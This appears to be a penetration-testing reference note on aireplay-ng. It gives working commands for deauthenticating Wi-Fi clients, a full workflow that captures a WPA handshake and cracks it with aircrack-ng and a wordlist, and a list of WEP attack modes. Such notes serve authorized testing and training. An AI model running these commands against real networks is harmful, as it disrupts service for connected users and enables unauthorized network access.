---
tags: [pentest, wireless, aircrack-ng, deauth, dos, both, initial-access]
tool: aireplay-ng
phase: 5
---
# aireplay-ng — Deauth

Inject 802.11 deauthentication frames to force client disconnects. Used to capture WPA handshakes when clients reconnect.

[[10 - Wireless/00 - README|Folder index]]

## Install / verify

```bash
which aireplay-ng
# Part of aircrack-ng suite
```

## Deauth a specific client (targeted)

```bash
sudo aireplay-ng -0 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
```

| Flag | Meaning |
| --- | --- |
| `-0 5` | Send 5 deauth packets (use `0` for continuous) |
| `-a` | AP BSSID |
| `-c` | Target client MAC |

## Deauth all clients on an AP (broadcast)

```bash
sudo aireplay-ng -0 10 -a <AP_BSSID> wlan0mon
```

> [!danger] Legal warning
> Deauth is a denial-of-service attack. Illegal without authorization. 802.11w (Protected Management Frames / PMF) blocks deauth — if the target uses WPA3 or WPA2+PMF, deauth won't work.

## Full handshake capture workflow

```bash
# 1. Start capture
sudo airodump-ng -c <CH> --bssid <BSSID> -w cap wlan0mon

# 2. In another terminal, deauth
sudo aireplay-ng -0 5 -a <BSSID> -c <CLIENT> wlan0mon

# 3. Watch airodump for "WPA handshake: <BSSID>"
# 4. Crack
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt cap-01.cap
```

## Other aireplay-ng attack modes

| Flag | Attack | Use case |
| --- | --- | --- |
| `-0` | Deauthentication | Force reconnect for handshake |
| `-1` | Fake authentication | Associate with WEP AP |
| `-2` | Interactive replay | Replay captured packets |
| `-3` | ARP replay | Generate WEP IVs |
| `-4` | KoreK chopchop | WEP key recovery |
| `-5` | Fragmentation | WEP key recovery |
| `-9` | Injection test | Verify adapter supports injection |

## Troubleshooting

| Symptom | Fix |
| --- | --- |
| No handshake captured | Client may not have reconnected — try more deauths or wait |
| `write failed: Cannot allocate memory` | Too many parallel deauths — reduce count |
| AP uses PMF/802.11w | Deauth blocked — use PMKID attack instead |

## See also

- [[04 - airodump-ng]]
- [[06 - aircrack-ng]]
- [[07 - hcxdumptool PMKID]]
- [[12 - mdk4]]
